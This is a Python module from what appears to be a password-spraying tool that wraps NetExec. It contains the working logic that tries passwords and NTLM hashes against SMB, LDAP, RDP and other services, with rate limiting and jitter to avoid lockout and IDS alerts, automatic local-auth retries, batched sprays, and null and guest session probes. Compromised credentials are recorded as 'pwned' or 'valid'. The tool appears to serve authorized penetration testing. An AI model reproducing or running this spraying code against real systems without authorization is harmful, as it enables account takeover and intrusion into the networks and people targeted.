"""The spray worker: one function run per credential attempt, plus the rate gate
and the null/guest pre-flight probes."""

import os
import random
import tempfile
import threading
import time

from . import state
from . import ui
from .parsing import (CLOCK_SKEW_MSG, banner, explain_output, is_clock_skew, mask_secret,
                      parse_bulk_line, parse_output, split_bulk_output)
from .protocols import (KERBEROS_PROTOCOLS, LOCAL_AUTH_PROTOCOLS, NATIVE_PROTOCOLS,
                        VALIDATE_IMPLEMENTED)
from .results import record_result
from .runners import run_native, run_nxc, run_nxc_bulk, validate_access
from .theme import (BOLD, DIM, GRAY, RED, RESET, YELLOW,
                    G_ERR, G_INFO, G_LOCK, G_SKIP, G_WARN, gradient_text, rule)


def rate_gate(rate):
    """Global token-bucket: cap attempts to `rate` per second across all threads."""
    if not rate:
        return
    with state.rate_lock:
        now  = time.time()
        slot = max(now, state.rate_state["next"])
        wait = slot - now
        state.rate_state["next"] = slot + 1.0 / rate
    if wait > 0:
        time.sleep(wait)


def spray_one(proto, target, user, secret, is_hash, logfile, args):
    """Run (and record) a single proto/target/user/secret attempt."""
    if state.abort.is_set():
        return

    tid = threading.get_ident()
    with state.active_lock:
        state.active[tid] = f"{proto}  {user}@{target}"

    quiet          = getattr(args, "quiet", False)
    label          = f"{proto:<6} {target:<15} {user}"
    if getattr(args, "use_kcache", False):
        secret_display = "(ticket)"
    else:
        secret_display = mask_secret(secret, is_hash)

    try:
        with state.locked_lock:
            if user in state.locked_users:
                return

        # an exact duplicate of this proto/target/user/secret — a repeated
        # line in a password file, or a combo already covered by --resume —
        # is dropped silently here, before any of the skip-checks or the
        # max-attempts reservation below. Without this early (read-only)
        # check, a true in-run duplicate would instead reach the max-attempts
        # gate and get logged as "max-attempts (N) reached", which is
        # misleading: it implies the account is lockout-capped, when it's
        # really just a redundant entry that never needed a second look.
        key = f"{proto}:{target}:{user}:{'H' if is_hash else 'P'}:{secret}"
        with state.seen_lock:
            if key in state.seen:
                return

        verbose = getattr(args, "verbose", False) and not quiet

        if proto in NATIVE_PROTOCOLS and is_hash:
            record_result(logfile, "skip", proto, target, user, "(hash)",
                          "hash auth unsupported for native protocol")
            if verbose:
                ui.cprint(f"  {G_SKIP} {GRAY}{label}  hash unsupported here{RESET}")
            return

        if proto in NATIVE_PROTOCOLS and args.proxychains:
            record_result(logfile, "skip", proto, target, user, secret_display,
                          "native protocol cannot route through proxychains")
            if verbose:
                ui.cprint(f"  {G_SKIP} {GRAY}{label}  skipped (native, no proxychains){RESET}")
            return

        kerberos   = getattr(args, "kerberos", False)
        use_kcache = getattr(args, "use_kcache", False)

        if kerberos and proto in NATIVE_PROTOCOLS:
            record_result(logfile, "skip", proto, target, user, secret_display,
                          "kerberos auth unsupported for native protocol")
            if verbose:
                ui.cprint(f"  {G_SKIP} {GRAY}{label}  kerberos unsupported here{RESET}")
            return

        if kerberos and proto not in NATIVE_PROTOCOLS and proto not in KERBEROS_PROTOCOLS:
            record_result(logfile, "skip", proto, target, user, secret_display,
                          f"kerberos unsupported for {proto} in this nxc build")
            if verbose:
                ui.cprint(f"  {G_SKIP} {GRAY}{label}  kerberos unsupported for {proto} "
                         f"in this nxc build{RESET}")
            return

        # per-account attempt cap (lockout safety) — check-and-reserve under one
        # lock acquisition, right before the attempt actually fires, so two
        # threads racing on the same user can't both pass the check before
        # either of them increments (the old gate did its check here but its
        # increment only after the network call returned, leaving a window the
        # full attempt duration wide). Everything above this point (hash/
        # proxychains/kerberos mismatches) never puts a bad password on the
        # wire, so it must not burn the budget — only reserve here, at the
        # last point before the real attempt. Released below if it turns out
        # not to be a real attempt (operational error, not a credential try).
        reserved = 0
        if args.max_attempts:
            with state.user_att_lock:
                if state.user_attempts.get(user, 0) >= args.max_attempts:
                    record_result(logfile, "skip", proto, target, user, secret_display,
                                  f"max-attempts ({args.max_attempts}) reached")
                    return
                state.user_attempts[user] = state.user_attempts.get(user, 0) + 1
                reserved += 1

        # --resume dedup, marked only now that every skip above (hash/
        # proxychains/kerberos mismatch, max-attempts cap) has been ruled
        # out — those return before here, so a combo this build/mode could
        # never actually attempt is never marked "seen". load_prior_attempts()
        # excludes "skip" lines from the reconstructed seen set for exactly
        # this reason — see its docstring — so this ordering only matters for
        # the live in-memory `state.seen` here, not the resume log reader.
        # the H/P marker distinguishes a literal secret tried as a hash from
        # the identical text tried as a plaintext password (e.g. the same
        # run once with -p, once auto-detected as a hash via -S/--combo) —
        # without it the two collide on the same key and a --resume run
        # wrongly treats one as covering the other, even though they're
        # different auth attempts against the wire. This is the SAME key the
        # early duplicate check above already tested — reached here only if
        # it wasn't already in `seen` at that point, so this add is the
        # normal case; a hit here instead means another thread raced us onto
        # the exact same combo between the two checks.
        with state.seen_lock:
            if key in state.seen:
                if reserved:   # someone else already claimed this combo
                    with state.user_att_lock:
                        state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - reserved)
                return
            state.seen.add(key)

        rate_gate(args.rate)
        if args.jitter:
            time.sleep(random.uniform(*args.jitter))

        if proto in NATIVE_PROTOCOLS:
            output, err = run_native(proto, target, user, secret, args.timeout)
        else:
            local_auth = args.local_auth
            output, err = run_nxc(proto, target, user, secret, is_hash,
                                  local_auth, args.timeout, args.proxychains,
                                  kerberos, getattr(args, "domain", None),
                                  getattr(args, "kdc_host", None), use_kcache)

            # nxc itself says "try again with or without '--local-auth'" when it
            # mangled the login into DOMAIN\user but the account is actually local
            # (or vice versa). Take the hint once instead of making the user notice
            # and re-run the whole spray by hand.
            #
            # An argparse usage dump (printed when this nxc build doesn't like
            # the flag combination) also lists "--local-auth" in its own
            # synopsis for every LOCAL_AUTH_PROTOCOLS protocol, which would
            # otherwise be misread as the real hint here — checked first (and
            # before the real usage-dump reclassification a few lines below
            # even runs) so a usage dump never triggers a wasted retry and an
            # un-refundable charge for an attempt that never checked a
            # credential at all.
            if (not err and "--local-auth" in output
                    and "usage: nxc" not in output and "invalid choice" not in output
                    and not use_kcache and not kerberos
                    and proto in LOCAL_AUTH_PROTOCOLS):
                # nxc's hint is direction-agnostic ("try again with or
                # without") — the retry must flip whatever local_auth
                # actually was, not always turn it on. Without this, running
                # with --local-auth already set (e.g. assuming a local
                # account against a target that's actually domain-joined)
                # silently never gets the "without" half of the retry.
                retry_local_auth = not local_auth
                retry_ok = True
                if args.max_attempts:   # the retry is a real auth attempt too
                    with state.user_att_lock:
                        if state.user_attempts.get(user, 0) >= args.max_attempts:
                            retry_ok = False
                        else:
                            state.user_attempts[user] = state.user_attempts.get(user, 0) + 1
                            reserved += 1   # tentatively outstanding — see below
                if retry_ok:
                    # a real second authentication to the target — it must
                    # respect --rate/--jitter the same as the first one, or
                    # a cap meant to pace requests (avoiding lockout/IDS
                    # alerting) gets silently violated by this retry.
                    rate_gate(args.rate)
                    if args.jitter:
                        time.sleep(random.uniform(*args.jitter))
                    retry_output, retry_err = run_nxc(proto, target, user, secret, is_hash,
                                                      retry_local_auth, args.timeout, args.proxychains,
                                                      kerberos, getattr(args, "domain", None),
                                                      getattr(args, "kdc_host", None), use_kcache)
                    if retry_err:
                        # the retry itself failed operationally — refund only
                        # its own charge right here and drop it out of
                        # `reserved`, instead of folding it into the generic
                        # `if err:` refund below. The initial attempt already
                        # got a real response from the wire (that's what
                        # triggered this retry in the first place) and keeps
                        # its own charge; output/err stay as the initial
                        # attempt's (untouched, still falsy) instead of being
                        # overwritten by the retry's operational failure.
                        if reserved:   # only if --max-attempts is even in play
                            with state.user_att_lock:
                                state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - 1)
                            reserved -= 1
                        if verbose:
                            ui.cprint(f"  {GRAY}{G_INFO} {label}  --local-auth retry "
                                     f"failed operationally ({retry_err}) — using "
                                     f"original result{RESET}")
                    else:
                        local_auth = retry_local_auth
                        output, err = retry_output, retry_err
                        # the retry succeeded operationally, so its output is
                        # now the final basis for everything below (including
                        # the usage-dump/skew/empty-output reclassification
                        # that follows this block) — but the INITIAL attempt
                        # already, definitely reached the wire (that's what
                        # triggered this retry), so its charge is locked in
                        # from here on. Drop it out of `reserved` so that if
                        # the retry's own output later gets reclassified into
                        # an operational error, the generic `if err:` refund
                        # below only gives back the retry's charge, not the
                        # initial attempt's legitimate one too.
                        if reserved:
                            reserved -= 1
                        if verbose:
                            how = "--local-auth" if retry_local_auth else "domain auth (no --local-auth)"
                            ui.cprint(f"  {GRAY}{G_INFO} {label}  retried with "
                                     f"{how} (nxc suggested it){RESET}")

        # nxc prints a usage dump when a build lacks the requested protocol —
        # turn that noise into a clean error instead of recording the help text.
        if not err and output and ("usage: nxc" in output or "invalid choice" in output):
            err, output = "protocol not supported by this nxc build", ""

        # clock skew with the KDC is an operational problem, not a bad credential —
        # don't burn a --max-attempts slot or record it as a failed password guess.
        if not err and output and is_clock_skew(output):
            err, output = CLOCK_SKEW_MSG, ""

        # some nxc protocol modules (ssh, for one — see proto_flow()'s
        # create_conn_obj()/remote_version checks) print nothing at all and exit
        # 0 when the port is closed/filtered or the banner is unrecognized. That's
        # a connectivity problem, not a tried-and-failed password — don't record
        # it as "authentication failed" and don't burn a --max-attempts slot on it.
        if not err and not output:
            err = f"{proto}: no response from {target} (closed/filtered port, or unsupported by nxc)"

        if err:
            # operational problem, not a real credential attempt — release every
            # reservation taken above (the initial attempt, and the local-auth
            # retry's own charge if it fired) so neither counts against the cap.
            if reserved:
                with state.user_att_lock:
                    state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - reserved)
            # the `seen` mark taken above assumed this would be a real
            # attempt — now that it's turned out to be an operational
            # failure instead, un-mark it too, or any later identical
            # attempt (a duplicate line in the same run, or a future
            # --resume run reading this very log) would short-circuit as
            # "already attempted" on a credential that was never actually
            # tested against the target.
            with state.seen_lock:
                state.seen.discard(key)
            record_result(logfile, "error", proto, target, user, secret_display, err, output)
            if verbose:
                ui.cprint(f"  {GRAY}{G_ERR} {label}  {err}{RESET}")
            return

        status = parse_output(proto, output)
        cred   = f"{proto:<6} {target:<15} {BOLD}{user}:{secret_display}{RESET}"

        if status == "locked":
            with state.locked_lock:
                state.locked_users.add(user)
            record_result(logfile, "locked", proto, target, user, secret_display,
                          "account locked out — skipping user", output)
            ui.cprint(f"  {RED}{G_LOCK} {label}  locked out — account skipped{RESET}", bold=True)
            return

        if status == "must_change":
            record_result(logfile, "must_change", proto, target, user,
                          secret_display, "valid — password must change", output,
                          secret_real=None if use_kcache else secret)
            ui.cprint(f"  {YELLOW}{G_WARN} {cred}{YELLOW}  {DIM}password must change{RESET}", bold=True)
            return

        if status in ("pwned", "valid"):
            is_access = status == "pwned"
            msg       = ""

            validate_unknown = False
            if status == "valid" and args.validate and proto in VALIDATE_IMPLEMENTED:
                validate_ok = True
                if args.max_attempts:   # the extra auth counts toward the cap too
                    with state.user_att_lock:
                        if state.user_attempts.get(user, 0) >= args.max_attempts:
                            validate_ok = False
                        else:
                            state.user_attempts[user] = state.user_attempts.get(user, 0) + 1
                if validate_ok:
                    ok, msg, op_failed = validate_access(proto, target, user, secret, is_hash,
                                                         args.timeout, kerberos,
                                                         getattr(args, "domain", None),
                                                         getattr(args, "kdc_host", None),
                                                         use_kcache, local_auth)
                    is_access = ok
                    if op_failed:
                        # a timeout/exception, not a real answer — we don't
                        # actually know whether this credential has elevated
                        # access, we just know validate_access() couldn't
                        # tell us. Refund the charge (same invariant every
                        # other operational-failure path here enforces), and
                        # don't let the --only-access filter below treat
                        # "couldn't confirm" the same as "confirmed not
                        # elevated" — the underlying credential genuinely
                        # authenticated and must not be silently dropped from
                        # every output (log/JSON/CSV/loot) just because the
                        # bonus check happened to fail operationally.
                        validate_unknown = True
                        if args.max_attempts:
                            with state.user_att_lock:
                                state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - 1)
                else:
                    # max-attempts capped the bonus check before it could
                    # even run — same "couldn't confirm, not confirmed-not-
                    # elevated" situation as the op_failed case above, so
                    # --only-access must not drop this credential either;
                    # the verbose message below says exactly that.
                    validate_unknown = True
                    if verbose:
                        ui.cprint(f"  {GRAY}{G_INFO} {label}  max-attempts reached — "
                                 f"skipping --validate, reporting as 'valid' not 'pwned'{RESET}")

            if args.only_access and not is_access and not validate_unknown:
                return

            detail = banner(output)
            if msg:
                detail = f"{detail}  ·  {msg}" if detail else msg
            rec = record_result(logfile, "pwned" if is_access else "valid",
                                proto, target, user, secret_display,
                                detail or "authenticated", output,
                                secret_real=None if use_kcache else secret)
            ui.cprint_hit(rec, is_access)
            return

        # status == "fail" — always recorded (one tidy line); terminal only with --explain
        reasons = explain_output(output or "")
        record_result(logfile, "fail", proto, target, user, secret_display,
                      reasons[0] if reasons else "authentication failed", output)
        if (args.explain or getattr(args, "verbose", False)) and reasons and not quiet:
            ui.cprint(f"  {GRAY}{G_INFO} {label}  {', '.join(reasons)}{RESET}")

    finally:
        with state.counter_lock:
            state.counter["done"] += 1
        with state.active_lock:
            state.active.pop(tid, None)
        ui.redraw()


def spray_bulk(proto, target, users, secret, logfile, args):
    """--bulk: one nxc invocation covers every user in ``users`` against this
    protocol/target/secret, instead of one subprocess per credential. Plain
    passwords only (no hashes, no combo/validate) — Kerberos is fine, nxc
    takes -k the same way for a userfile as for a single -u. See
    run_nxc_bulk() and the --bulk help text for exactly what else that trades away."""
    if state.abort.is_set():
        return

    tid = threading.get_ident()
    with state.active_lock:
        state.active[tid] = f"{proto}(bulk×{len(users)})  @{target}"

    quiet   = getattr(args, "quiet", False)
    verbose = getattr(args, "verbose", False) and not quiet
    kerberos = getattr(args, "kerberos", False)
    total_users = len(users)

    try:
        # same live lockout check spray_one() does — the submission-time
        # snapshot in _submit() only catches accounts already locked when the
        # wave was queued; a user can lock out from an earlier target/protocol
        # in the same run while this batch sits in the thread pool's queue, so
        # it has to be rechecked here too, right before actually spraying.
        with state.locked_lock:
            now_locked = [u for u in users if u in state.locked_users]
        users = [u for u in users if u not in now_locked]
        for user in now_locked:
            record_result(logfile, "skip", proto, target, user, secret,
                          "account locked out — skipping user")
        # total_users (what `finally` adds to counter["done"]) stays at the
        # original batch size — _submit() already costed this whole batch
        # into counter["total"] at submission time, so "done" must still
        # account for these users even though they're skipped here, same as
        # spray_one()'s finally always bumping "done" regardless of the
        # branch it returned from.
        if not users:
            return

        # same per-account attempt cap spray_one() enforces — --bulk collapsing
        # a whole wave into one nxc call must not let --max-attempts/--safe's
        # lockout budget go unchecked just because there's no per-credential
        # call site left to gate. Reserve each included user's charge now,
        # before the batch fires; refunded below in one shot if the whole
        # nxc invocation turns out to be an operational failure rather than a
        # real attempt reaching the wire for anyone in the batch. Done before
        # the --resume seen-marking below (same ordering spray_one() uses,
        # see its comment at the equivalent point) — a user capped out here
        # never reaches nxc, so their key must not be marked "seen" or a
        # later --resume run would skip them forever even though this run
        # never actually attempted them.
        reserved = False
        if args.max_attempts:
            capped = []
            with state.user_att_lock:
                keep = []
                for user in users:
                    if state.user_attempts.get(user, 0) >= args.max_attempts:
                        capped.append(user)
                    else:
                        state.user_attempts[user] = state.user_attempts.get(user, 0) + 1
                        keep.append(user)
            for user in capped:
                record_result(logfile, "skip", proto, target, user, secret,
                              f"max-attempts ({args.max_attempts}) reached")
            users = keep
            reserved = True
            if not users:
                return

        # same --resume de-duplication spray_one() applies per credential —
        # a user already recorded in a prior log for this exact proto/target/
        # secret shouldn't be re-sprayed just because --bulk batches a whole
        # wave into one nxc call instead of one job per credential.
        to_spray, resumed, key_for = [], [], {}
        with state.seen_lock:
            for user in users:
                # --bulk is plaintext-only (see the module docstring), but
                # the key format must match spray_one()'s H/P-tagged keys —
                # both mark plaintext as "P" — so a password sprayed once via
                # --bulk and once per-credential still dedupes against itself.
                key = f"{proto}:{target}:{user}:P:{secret}"
                key_for[user] = key   # kept so any refund path below can
                                      # un-mark `seen` for a user whose
                                      # reservation turns out not to cover a
                                      # real attempt (see spray_one()'s
                                      # equivalent comment on its `if err:`)
                if key in state.seen:
                    resumed.append(user)
                else:
                    state.seen.add(key)
                    to_spray.append(user)
        for user in resumed:
            record_result(logfile, "skip", proto, target, user, secret,
                          "already attempted (resume)")
            # this charge was reserved above but the user turns out to be a
            # resume-skip, not a real attempt — refund it.
            if reserved:
                with state.user_att_lock:
                    state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - 1)
        if not to_spray:
            return
        users = to_spray

        userfile = None
        try:
            # assign userfile to the created path BEFORE writing to it, not
            # after — NamedTemporaryFile(delete=False) creates the file on
            # disk immediately, so if the write itself raises (disk full,
            # permissions change mid-run), userfile must already be set or
            # the finally block's cleanup below has nothing to unlink and
            # that now-orphaned temp file leaks permanently.
            with tempfile.NamedTemporaryFile("w", delete=False, suffix=".txt") as uf:
                userfile = uf.name
                uf.write("\n".join(users))

            # one nxc process has to work through every user in this batch —
            # scale the subprocess timeout with the batch size instead of
            # using the per-credential --timeout as-is, or large batches would
            # get killed before nxc finishes them. The ceiling exists to stop
            # a huge batch from running indefinitely, but it must leave real
            # room ABOVE the user's own --timeout for that scaling to do
            # anything — capping the ceiling at exactly args.timeout (as an
            # earlier version of this did) collapsed batch_timeout to plain
            # args.timeout for any batch of 3+ users whenever --timeout
            # itself exceeded 3600, silently defeating the scaling entirely
            # for someone who explicitly configured a large --timeout (e.g.
            # a slow proxychains hop) specifically to avoid that.
            batch_timeout = min(max(args.timeout, args.timeout * len(users) // 3),
                                max(3600, args.timeout * 10))

            output, err = run_nxc_bulk(proto, target, userfile, secret, args.local_auth,
                                       batch_timeout, args.proxychains, kerberos,
                                       getattr(args, "domain", None),
                                       getattr(args, "kdc_host", None))
        finally:
            if userfile:
                try:
                    os.unlink(userfile)
                except OSError:
                    pass

        hits = split_bulk_output(output, secret)

        # nxc prints a usage dump when a build lacks the requested protocol,
        # or can abort a batch on clock skew severe enough that it never
        # prints a single per-user [+]/[-] line — in either case
        # split_bulk_output() above finds no hits at all, and without this
        # every user in the batch would fall into the vague "no result"
        # catch-all below instead of a specific, actionable error. Gated on
        # `not hits`: a real batch can have some users fail with the literal
        # text "usage: nxc"/clock-skew markers embedded in nxc's own
        # explanatory text for just THAT user while every other user still
        # got a real result — converting the WHOLE batch to a single error
        # here (as an earlier version of this check did, unconditionally)
        # would discard every other user's genuine pwned/valid/fail result
        # along with it. The per-line is_clock_skew() check further down
        # still handles skew affecting only some users in a batch that did
        # produce real result lines.
        if not err and not hits and output:
            if "usage: nxc" in output or "invalid choice" in output:
                err, output = "protocol not supported by this nxc build", ""
            elif is_clock_skew(output):
                err, output = CLOCK_SKEW_MSG, ""

        label = f"{proto:<6} {target:<15} (bulk×{len(users)})"
        if err:
            # operational failure for the whole batch — no real attempt
            # reached the wire for anyone in it, so refund every reservation
            # taken above (same invariant spray_one() enforces per-credential).
            if reserved:
                with state.user_att_lock:
                    for user in users:
                        state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - 1)
            # un-mark `seen` for the same reason spray_one()'s `if err:`
            # branch does — these users were never actually attempted, so a
            # later duplicate or --resume run must not skip them.
            with state.seen_lock:
                for user in users:
                    state.seen.discard(key_for[user])
            # one record per real user, not a single row with a fabricated
            # "(bulk×N)" placeholder in the `user` field — every other status
            # (locked/pwned/fail/skip/etc.) in this file and spray_one() puts
            # exactly one real account per record_result() call, and a CSV/
            # JSON/log consumer counting or cross-referencing accounts by that
            # column shouldn't have to filter out a non-username row shape.
            for user in users:
                record_result(logfile, "error", proto, target, user, secret, err, output)
            if verbose:
                ui.cprint(f"  {GRAY}{G_ERR} {label}  {err}{RESET}")
            return

        # nxc echoes back the directory's canonical case (e.g. input "jsmith"
        # reported as "JSmith"), but every lockout/dedup check elsewhere
        # (state.locked_users, state.seen, state.user_attempts, and the
        # live-recheck above) does a case-sensitive lookup against the
        # original input casing. Map each parsed hit back to that original
        # casing before using it for anything, or a locked/already-attempted
        # account recorded under nxc's casing would be invisible to those
        # checks on the next wave/protocol/target.
        #
        # An exact (case-sensitive) match against the input batch is checked
        # first and kept as-is — only falling back to the case-insensitive
        # map when nxc's casing doesn't exactly match anything — so two
        # distinct, differently-cased entries in the same userlist (e.g.
        # "rose" and "ROSE") don't collapse onto a single identity whenever
        # nxc happens to echo one of them back verbatim.
        orig_set = set(users)
        orig_case, by_lower, ambiguous_lower = {}, {}, set()
        for u in users:
            lo = u.lower()
            by_lower.setdefault(lo, []).append(u)
            if lo in orig_case and orig_case[lo] != u:
                # two genuinely distinct, differently-cased entries in this
                # same batch (e.g. "rose" and "ROSE") — if nxc later echoes
                # a casing matching neither exactly, there is no reliable way
                # to tell which of the two it meant, so that key is flagged
                # rather than silently guessed.
                ambiguous_lower.add(lo)
            else:
                orig_case[lo] = u
        # resolve one lowercased key against the batch: "AMBIGUOUS" if it's a
        # same-batch case collision (checked FIRST, before accepting any
        # match from orig_case — a UPN-stripped key is just as capable of
        # landing on an ambiguous lowercase as a direct one, so both lookups
        # below go through this same gate instead of the UPN fallback
        # checking orig_case on its own and skipping the ambiguity check).
        def _resolve_lo(lo):
            if lo in ambiguous_lower:
                return "AMBIGUOUS"
            return orig_case.get(lo)

        seen_users = set()
        for mark, user, rest in hits:
            if user not in orig_set:
                lo = user.lower()
                resolved = _resolve_lo(lo)
                if resolved is None:
                    # doesn't match any batch entry at all even case-
                    # insensitively — e.g. LDAP/Kerberos echoing a UPN
                    # ("rose@corp.local") instead of the submitted bare
                    # username. Try stripping a UPN-style domain suffix
                    # before giving up — through the same ambiguity-checked
                    # resolver, not a direct orig_case lookup.
                    lo = user.split("@", 1)[0].lower()
                    resolved = _resolve_lo(lo)

                if resolved == "AMBIGUOUS":
                    # couldn't confirm either colliding user's result — same
                    # "not actually tested" situation as no_result/resumed
                    # below, so refund their charge too; without this,
                    # ambiguous casing permanently inflates user_attempts for
                    # credentials that were never conclusively put on the wire.
                    if reserved:
                        with state.user_att_lock:
                            for u in by_lower[lo]:
                                state.user_attempts[u] = max(0, state.user_attempts.get(u, 0) - 1)
                    with state.seen_lock:
                        for u in by_lower[lo]:
                            state.seen.discard(key_for[u])
                    record_result(logfile, "error", proto, target, user, secret,
                                  f"nxc reported this user as '{user}', which doesn't "
                                  f"exactly match any of this batch's case-distinct "
                                  f"entries for '{lo}' — cannot reliably attribute "
                                  f"this result, re-run this user outside --bulk",
                                  output)
                    # mark every colliding original-case entry as "seen" too —
                    # one unattributable-result error already covers this
                    # ambiguity; without this the end-of-batch "no result"
                    # sweep below would pile on a second, redundant error for
                    # each of them on top of the one just recorded.
                    seen_users.update(by_lower[lo])
                    continue

                if resolved is None:
                    # genuinely unrecognised — recording it as-is would
                    # fabricate a brand-new identity (possibly a bogus
                    # "pwned" hit) that was never in this batch's
                    # userlist. Flag it instead of guessing.
                    record_result(logfile, "error", proto, target, user, secret,
                                  f"nxc reported this result for '{user}', which "
                                  f"doesn't match any user in this batch — cannot "
                                  f"reliably attribute it, re-run outside --bulk",
                                  output)
                    continue

                user = resolved
            seen_users.add(user)

            # clock skew with the KDC is an operational problem, not a bad
            # credential — same guard spray_one() applies per-credential.
            # Without it, parse_bulk_line() has no marker for this and falls
            # through to "fail", burning this user's --max-attempts charge on
            # an attempt that never really tested their password.
            if is_clock_skew(rest):
                if reserved:
                    with state.user_att_lock:
                        state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - 1)
                with state.seen_lock:
                    state.seen.discard(key_for[user])
                record_result(logfile, "error", proto, target, user, secret,
                              CLOCK_SKEW_MSG, output)
                if verbose:
                    ui.cprint(f"  {GRAY}{G_ERR} {proto:<6} {target:<15} {user}  "
                             f"clock skew with KDC{RESET}")
                continue

            status = parse_bulk_line(mark, rest)

            if status == "locked":
                with state.locked_lock:
                    state.locked_users.add(user)
                record_result(logfile, "locked", proto, target, user, secret,
                              "account locked out — skipping user", output)
                ui.cprint(f"  {RED}{G_LOCK} {proto:<6} {target:<15} {user}  "
                         f"locked out — account skipped{RESET}", bold=True)
                continue

            if status == "must_change":
                record_result(logfile, "must_change", proto, target, user, secret,
                              "valid — password must change", output)
                ui.cprint(f"  {YELLOW}{G_WARN} {proto:<6} {target:<15} "
                         f"{BOLD}{user}:{secret}{RESET}{YELLOW}  {DIM}password must change{RESET}",
                         bold=True)
                continue

            if status in ("pwned", "valid"):
                is_access = status == "pwned"
                if args.only_access and not is_access:
                    continue
                rec = record_result(logfile, "pwned" if is_access else "valid",
                                    proto, target, user, secret, rest or "authenticated", output)
                ui.cprint_hit(rec, is_access)
                continue

            reasons = explain_output(rest or "")
            record_result(logfile, "fail", proto, target, user, secret,
                          reasons[0] if reasons else "authentication failed", output)
            if (args.explain or verbose) and reasons and not quiet:
                ui.cprint(f"  {GRAY}{G_INFO} {proto:<6} {target:<15} {user}  "
                         f"{', '.join(reasons)}{RESET}")

        # nxc can bail out of the userlist early (gfail-limit, a lockout it
        # detected itself) — anything it never printed a line for still needs
        # an explicit record instead of silently vanishing. Compared
        # case-insensitively: nxc echoes back the directory's canonical case
        # (e.g. input "jsmith" reported as "JSmith"), which must still count
        # as a result for that user, not a spurious early-exit error.
        seen_lower = {u.lower() for u in seen_users}
        no_result = [u for u in users if u.lower() not in seen_lower]
        if no_result and reserved:
            # nxc never actually reached these users (early exit, or — per
            # spray_one()'s equivalent comment — a closed/filtered port makes
            # some protocol modules exit 0 with no output at all) — no real
            # attempt reached the wire, so refund their charge same as any
            # other operational-failure path.
            with state.user_att_lock:
                for user in no_result:
                    state.user_attempts[user] = max(0, state.user_attempts.get(user, 0) - 1)
        if no_result:
            with state.seen_lock:
                for user in no_result:
                    state.seen.discard(key_for[user])
        # if nxc aborted partway through on clock skew (rather than printing
        # nothing at all, the whole-output check above only fires on zero
        # hits so real results earlier in the batch aren't discarded), the
        # users it never got to deserve the specific, actionable message
        # too — not just the generic "early exit?" guess.
        no_result_detail = (CLOCK_SKEW_MSG if is_clock_skew(output)
                            else "no result from bulk nxc run (early exit?)")
        for user in no_result:
            record_result(logfile, "error", proto, target, user, secret,
                          no_result_detail, output)

    finally:
        with state.counter_lock:
            state.counter["done"] += total_users
        with state.active_lock:
            state.active.pop(tid, None)
        ui.redraw()


def preflight_checks(protocols, targets, args, logfile):
    """Quick anonymous / guest session probes before the real spray."""
    if getattr(args, "use_kcache", False):
        # --null/--guest test a blank/anonymous NTLM credential — there's no
        # equivalent concept under --use-kcache's ticket-based auth, and
        # forcing -u ""/-p "" through alongside -k/-d would just send a
        # nonsensical empty-principal Kerberos request instead of either a
        # real null-session probe or a real kcache probe.
        return
    probes = []
    if args.null:
        probes.append(("", "", "null session"))
    if args.guest:
        probes.append(("guest", "", "guest / blank"))
    if not probes:
        return

    checkable = [p for p in protocols if p in ("smb", "ldap", "rdp")]
    if not checkable:
        return

    ui.cprint(f"\n{gradient_text('▎ pre-flight')} {rule(26 - 10)}")
    for target in targets:
        for proto in checkable:
            for user, pw, note in probes:
                # forward the same -k/-d/--kdc-host the real spray will use —
                # against a Kerberos-enforced/NTLM-disabled target, a plain
                # NTLM null/guest probe fails for an unrelated reason and
                # reports a misleading "refused" instead of reflecting how
                # the actual spray will behave.
                output, err = run_nxc(proto, target, user, pw, False,
                                      args.local_auth, args.timeout, args.proxychains,
                                      getattr(args, "kerberos", False),
                                      getattr(args, "domain", None),
                                      getattr(args, "kdc_host", None))
                if err or (output and ("usage: nxc" in output or "invalid choice" in output)):
                    continue
                status = parse_output(proto, output)
                disp = user or "(null)"
                if status in ("pwned", "valid"):
                    rec = record_result(logfile, "valid", proto, target, disp,
                                        pw or "(blank)", f"{note} allowed · {banner(output)}", output)
                    ui.cprint_hit(rec, status == "pwned")
                elif getattr(args, "verbose", False) and not args.quiet:
                    ui.cprint(f"  {GRAY}{G_INFO} {proto:<6} {target:<15} {disp}  {note} refused{RESET}")
